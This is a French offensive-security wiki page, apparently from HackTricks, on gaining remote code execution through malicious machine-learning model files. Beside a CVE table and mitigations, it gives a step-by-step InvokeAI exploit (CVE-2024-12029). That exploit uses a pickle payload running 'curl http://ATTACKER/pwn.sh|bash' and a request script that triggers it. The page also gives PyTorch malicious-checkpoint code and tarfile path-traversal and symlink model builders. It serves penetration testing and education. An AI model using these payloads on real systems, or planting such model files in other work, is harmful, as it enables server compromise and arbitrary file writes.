# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Chargement des modèles pour RCE

Les modèles d'apprentissage automatique sont généralement partagés dans différents formats, tels que ONNX, TensorFlow, PyTorch, etc. Ces modèles peuvent être chargés sur les machines des développeurs ou dans des systèmes de production pour les utiliser. En général, les modèles ne devraient pas contenir de code malveillant, mais il existe des cas où le modèle peut être utilisé pour exécuter du code arbitraire sur le système en tant que fonctionnalité prévue ou en raison d'une vulnérabilité dans la bibliothèque de chargement du modèle.

Au moment de la rédaction, voici quelques exemples de ce type de vulnérabilités :

| **Framework / Outil**      | **Vulnérabilité (CVE si disponible)**                                                                                       | **Vecteur RCE**                                                                                                                         | **Références**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Désérialisation non sécurisée dans* `torch.load` **(CVE-2025-32434)**                                                     | Pickle malveillant dans le point de contrôle du modèle conduit à l'exécution de code (contournant la protection `weights_only`)            | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                        | SSRF + téléchargement de modèle malveillant provoque l'exécution de code ; désérialisation RCE Java dans l'API de gestion                | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML non sécurisé) <br> **CVE-2024-3660** (Keras Lambda)                                               | Chargement de modèle à partir de YAML utilise `yaml.unsafe_load` (exécution de code) <br> Chargement de modèle avec la couche **Lambda** exécute du code Python arbitraire | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (analyse TFLite)                                                                                         | Modèle `.tflite` malformé déclenche un dépassement d'entier → corruption de la mémoire (RCE potentiel)                                   | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                          | Chargement d'un modèle via `joblib.load` exécute pickle avec le payload `__reduce__` de l'attaquant                                     | |
| **NumPy** (Python)          | **CVE-2019-6446** (non sécurisé `np.load`) *contesté*                                                                        | `numpy.load` par défaut permettait des tableaux d'objets picklés – `.npy/.npz` malveillant déclenche l'exécution de code                | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (traversée de répertoire) <br> **CVE-2024-5187** (traversée tar)                                         | Le chemin des poids externes du modèle ONNX peut échapper au répertoire (lecture de fichiers arbitraires) <br> Modèle ONNX malveillant tar peut écraser des fichiers arbitraires (menant à RCE) | |
| Runtime ONNX (risque de conception) | *(Pas de CVE)* opérations personnalisées ONNX / flux de contrôle                                                        | Modèle avec opérateur personnalisé nécessite le chargement du code natif de l'attaquant ; des graphes de modèles complexes abusent de la logique pour exécuter des calculs non prévus | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (traversée de chemin)                                                                                     | Utiliser l'API de chargement de modèle avec `--model-control` activé permet une traversée de chemin relative pour écrire des fichiers (par exemple, écraser `.bashrc` pour RCE) | |
| **GGML (format GGUF)**      | **CVE-2024-25664 … 25668** (multiples dépassements de tas)                                                                  | Fichier de modèle GGUF malformé provoque des dépassements de tampon dans le parseur, permettant l'exécution de code arbitraire sur le système victime | |
| **Keras (anciens formats)** | *(Pas de nouveau CVE)* Modèle Keras H5 hérité                                                                                 | Modèle HDF5 (`.h5`) malveillant avec code de couche Lambda s'exécute toujours au chargement (Keras safe_mode ne couvre pas l'ancien format – "attaque de rétrogradation") | |
| **Autres** (général)        | *Défaut de conception* – Sérialisation Pickle                                                                                 | De nombreux outils ML (par exemple, formats de modèle basés sur pickle, `pickle.load` de Python) exécuteront du code arbitraire intégré dans les fichiers de modèle à moins d'être atténués | |

De plus, il existe des modèles basés sur pickle Python comme ceux utilisés par [PyTorch](https://github.com/pytorch/pytorch/security) qui peuvent être utilisés pour exécuter du code arbitraire sur le système s'ils ne sont pas chargés avec `weights_only=True`. Ainsi, tout modèle basé sur pickle pourrait être particulièrement susceptible à ce type d'attaques, même s'ils ne sont pas listés dans le tableau ci-dessus.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` est une interface web open-source populaire pour Stable-Diffusion. Les versions **5.3.1 – 5.4.2** exposent le point de terminaison REST `/api/v2/models/install` qui permet aux utilisateurs de télécharger et de charger des modèles à partir d'URLs arbitraires.

En interne, le point de terminaison appelle finalement :
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Lorsque le fichier fourni est un **checkpoint PyTorch (`*.ckpt`)**, `torch.load` effectue une **désérialisation pickle**. Étant donné que le contenu provient directement de l'URL contrôlée par l'utilisateur, un attaquant peut intégrer un objet malveillant avec une méthode `__reduce__` personnalisée à l'intérieur du checkpoint ; la méthode est exécutée **lors de la désérialisation**, conduisant à une **exécution de code à distance (RCE)** sur le serveur InvokeAI.

La vulnérabilité a été attribuée à **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Guide d'exploitation

1. Créer un checkpoint malveillant :
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hébergez `payload.ckpt` sur un serveur HTTP que vous contrôlez (par exemple, `http://ATTACKER/payload.ckpt`).
3. Déclenchez le point de terminaison vulnérable (aucune authentification requise) :
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Lorsque InvokeAI télécharge le fichier, il appelle `torch.load()` → le gadget `os.system` s'exécute et l'attaquant obtient une exécution de code dans le contexte du processus InvokeAI.

Exploitation prête à l'emploi : **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automatise tout le flux.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (drapeau de scan par défaut **false**)
•  `/api/v2/models/install` accessible par l'attaquant
•  Le processus a les permissions pour exécuter des commandes shell

#### Atténuations

* Mettez à niveau vers **InvokeAI ≥ 5.4.3** – le correctif définit `scan=True` par défaut et effectue une analyse de logiciels malveillants avant la désérialisation.
* Lors du chargement de points de contrôle de manière programmatique, utilisez `torch.load(file, weights_only=True)` ou le nouvel [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.
* Appliquez des listes d'autorisation / signatures pour les sources de modèles et exécutez le service avec le moindre privilège.

> ⚠️ N'oubliez pas que **tout** format basé sur Python pickle (y compris de nombreux fichiers `.pt`, `.pkl`, `.ckpt`, `.pth`) est intrinsèquement dangereux à désérialiser à partir de sources non fiables.

---

Exemple d'une atténuation ad hoc si vous devez maintenir des versions plus anciennes d'InvokeAI fonctionnant derrière un proxy inverse :
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## Exemple – création d'un modèle PyTorch malveillant

- Créer le modèle :
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Charger le modèle :
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modèles pour le Traversée de Chemin

Comme commenté dans [**cet article de blog**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), la plupart des formats de modèles utilisés par différents frameworks d'IA sont basés sur des archives, généralement `.zip`. Par conséquent, il pourrait être possible d'abuser de ces formats pour effectuer des attaques de traversée de chemin, permettant de lire des fichiers arbitraires depuis le système où le modèle est chargé.

Par exemple, avec le code suivant, vous pouvez créer un modèle qui créera un fichier dans le répertoire `/tmp` lorsqu'il est chargé :
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ou, avec le code suivant, vous pouvez créer un modèle qui créera un symlink vers le répertoire `/tmp` lorsqu'il sera chargé :
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Plongée approfondie : désérialisation .keras et recherche de gadgets

Pour un guide ciblé sur les internals de .keras, RCE de la couche Lambda, le problème d'importation arbitraire dans ≤ 3.8, et la découverte de gadgets post-correction à l'intérieur de la liste blanche, voir :

{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Références

- [OffSec blog – "CVE-2024-12029 – Désérialisation de données non fiables par InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [Commit de patch InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Documentation du module Metasploit de Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – considérations de sécurité pour torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
